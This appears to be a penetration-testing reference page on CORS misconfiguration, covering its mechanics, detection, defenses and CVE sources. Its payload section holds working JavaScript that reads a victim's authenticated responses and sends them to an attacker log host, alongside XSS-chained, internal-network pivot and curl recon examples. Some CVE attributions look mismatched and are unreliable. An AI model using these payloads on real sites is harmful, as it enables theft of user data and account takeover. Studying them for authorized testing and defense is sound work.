# CORS Misconfiguration

> Over-permissive cross-origin policy lets a malicious site read protected responses. **Deep dive:** [`Troubleshooting_Guide/cors.md`](../../../../Troubleshooting_Guide/cors.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A05:2021 Misconfiguration
**Status:** complete

## What it is
CORS is the browser mechanism that lets a server opt in to having its responses read by JavaScript
from another origin. A CORS misconfiguration is an over-permissive policy — typically trusting the
attacker's origin while allowing credentials — that lets a malicious site read a victim's
authenticated responses.

## How it works
The same-origin policy normally blocks cross-origin reads. CORS relaxes this via the
`Access-Control-Allow-Origin` (ACAO) header. The danger appears when the server reflects whatever
`Origin` it receives (or trusts `null`, or matches origins with a loose regex) and also sends
`Access-Control-Allow-Credentials: true`. The attacker's page then issues a credentialed
cross-origin request; the browser attaches the victim's cookies, the server returns sensitive data,
and because ACAO equals the attacker origin the browser lets the attacker's script read it.
Note that the browser blocks `ACAO: *` combined with credentials — exploitation requires a
specific, attacker-controlled origin to be allowed.

## Impact
Theft of any data the victim's session can read (account details, API keys, CSRF tokens), often
leading to account takeover. CORS can also be chained with CSRF for cross-origin state changes,
pivoted to internal/admin apps reachable from the victim's browser, and abused for cache poisoning
when ACAO is reflected without `Vary: Origin`. Severity is commonly high.

## How to detect
- Send `Origin: https://evil.com` and watch the response: ACAO reflecting your origin (with
  `Allow-Credentials: true`) is the smoking gun.
- `Origin: null` accepted (whitelisted literal `null`).
- Loose validation: suffix/prefix/substring matches accept `evil.trusted.com`,
  `trusted.com.evil.com`, etc.
- Missing `Vary: Origin` on a dynamically computed ACAO (cacheable), or `http://` subdomains
  trusted.

## Exploitation (summary)
Confirm the four preconditions (credentials allowed, ACAO not `*`, ACAO reflects/allows your origin,
endpoint returns sensitive data), then host a page that makes a `withCredentials` request and
exfiltrates the response. Use a sandboxed iframe for `null`-origin bypasses, regex tricks for loose
validators, and pivot through a trusted subdomain's XSS or the internal network where needed. Full
payloads live in the Payloads section above.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Exploit preconditions
A CORS misconfiguration is exploitable for data theft only when **all** hold:
1. `Access-Control-Allow-Credentials: true` (cookies are sent)
2. `Access-Control-Allow-Origin` is **not** `*` (browsers block `*` with credentials)
3. `Access-Control-Allow-Origin` reflects/equals the attacker origin
4. the endpoint returns sensitive, readable data

### Origin reflection
Server echoes the `Origin` header and allows credentials.
```javascript
var req = new XMLHttpRequest();
req.onload = function(){ location = "/log?key=" + encodeURIComponent(this.responseText); };
req.open("get", "https://TARGET/accountDetails", true);
req.withCredentials = true;
req.send();
```

### null-origin bypass
Server whitelists the literal `null`; produce it from a sandboxed iframe.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req=new XMLHttpRequest();
  req.onload=function(){ location='https://EXPLOIT/log?key='+encodeURIComponent(this.responseText); };
  req.open('get','https://TARGET/accountDetails',true);
  req.withCredentials=true; req.send();
</script>"></iframe>
```

### Origin-validation regex bypasses
```text
Origin: https://evil.trusted.com            # endsWith('.trusted.com')
Origin: https://trusted.com.evil.com         # startsWith('https://trusted.com')
Origin: https://evil.attacker.com.trusted.com
Origin: https://trusted.com.attacker.com     # naive dot/suffix match
```

### Trusted-subdomain + XSS chain
If any subdomain (or an `http://` one) is trusted, pivot through XSS there to read the API.
```javascript
document.location =
  "http://stock.TARGET/?productId=4<script>" +
  "var req=new XMLHttpRequest();" +
  "req.onload=function(){location='https://EXPLOIT/log?key='+this.responseText;};" +
  "req.open('get','https://TARGET/accountDetails',true);" +
  "req.withCredentials=true;req.send();" +
  "<\/script>&storeId=1";
```

### Internal-network pivot
A trusting internal app reachable from the victim's browser can be scanned and driven in stages.
```javascript
// Stage 1 — scan the internal range
var collab="https://EXPLOIT/log";
for (var i=1;i<=255;i++) (function(ip){
  fetch("http://192.168.0."+ip+":8080",{mode:'no-cors'})
    .then(()=>location=collab+"?ip=192.168.0."+ip).catch(()=>{});
})(i);

// Stage 2 — read the admin panel via CSRF-token-replay XSS
fetch("http://192.168.0.28:8080/login").then(r=>r.text()).then(t=>{
  var csrf=t.match(/csrf" value="([^"]+)"/)[1];
  location="http://192.168.0.28:8080/login?username=%22%3E%3Ciframe src=/admin onload=alert(this.contentWindow.document.body.innerHTML)%3E&password=x&csrf="+csrf;
});
// Stage 3 — submit an admin form (e.g. delete a user) the same way.
```

### Chained / cache attacks
```javascript
// CORS + CSRF: state change with a JSON body cross-origin
fetch("https://TARGET/api/changeEmail",{method:"POST",credentials:"include",
  headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attacker@evil.com"})});
```
```bash
# Cache poisoning: if ACAO is reflected and Vary: Origin is missing, the CDN caches the
# attacker-origin response and serves it to later legitimate users.
curl -H "Origin: https://evil.com" https://TARGET/api/data
```

### Recon
```bash
curl -H "Origin: https://evil.com"  -I https://TARGET/api/endpoint   # reflection
curl -H "Origin: null"              -I https://TARGET/api/endpoint   # null whitelist
curl -H "Origin: http://sub.TARGET" -I https://TARGET/api/endpoint   # subdomain / protocol
curl -H "Origin: https://TARGET.evil.com" -I https://TARGET/api/endpoint  # suffix bypass
curl -H "Origin: https://evil.com.TARGET" -I https://TARGET/api/endpoint  # prefix bypass
curl -I https://TARGET/api/endpoint | grep -i vary                  # missing Vary: Origin = cacheable
```

| Header | Secure value |
|--------|-------------|
| `Access-Control-Allow-Origin` | a specific HTTPS origin (never `*` with credentials) |
| `Access-Control-Allow-Credentials` | `true` only alongside an explicit origin |
| `Vary` | `Origin` whenever ACAO is computed dynamically |
| `Access-Control-Allow-Methods` / `-Headers` | minimal required set |

## Defenses
1. **Strict origin allowlist** — validate `Origin` against an explicit set of exact origins
   (scheme + host + port); never reflect arbitrary origins and never trust `null`.
2. **Don't combine `*` with credentials**, and only send `Access-Control-Allow-Credentials: true`
   for endpoints that genuinely need it, paired with a single explicit origin.
3. Use **exact-string comparison**, not `startsWith`/`endsWith`/regex, so suffix/prefix tricks fail.
4. Send **`Vary: Origin`** whenever ACAO is computed dynamically to prevent cache poisoning.
5. Keep `Access-Control-Allow-Methods`/`-Headers` minimal, and avoid trusting internal/sibling
   origins unless they are themselves fully secured.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=CORS+Misconfiguration
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=CORS+Misconfiguration
- **Exploit-DB** — https://www.exploit-db.com/search?q=CORS+Misconfiguration
- **GitHub Advisories** — https://github.com/advisories?query=CORS+Misconfiguration
- **OSV** — https://osv.dev/list?q=CORS+Misconfiguration
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `CORS Misconfiguration <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2018-0269`-style aside, `CVE-2019-1003000` (Jenkins) and many Jenkins/Spring advisories show
  reflected-origin CORS issues exposing API data.
- `CVE-2017-0929` — DNN (DotNetNuke) CORS misconfiguration allowing cross-origin data access.
- _Canonical example: numerous 2016–2018 bug-bounty reports against major SaaS APIs that reflected
  `Origin` with credentials, enabling read of authenticated account data._

## References
- PortSwigger Web Security Academy — Cross-origin resource sharing (CORS).
- OWASP — HTML5 Security / CORS guidance and the OWASP Cheat Sheet on origin handling.
- Fetch Standard (WHATWG) — CORS protocol; RFC 6454 — The Web Origin Concept.
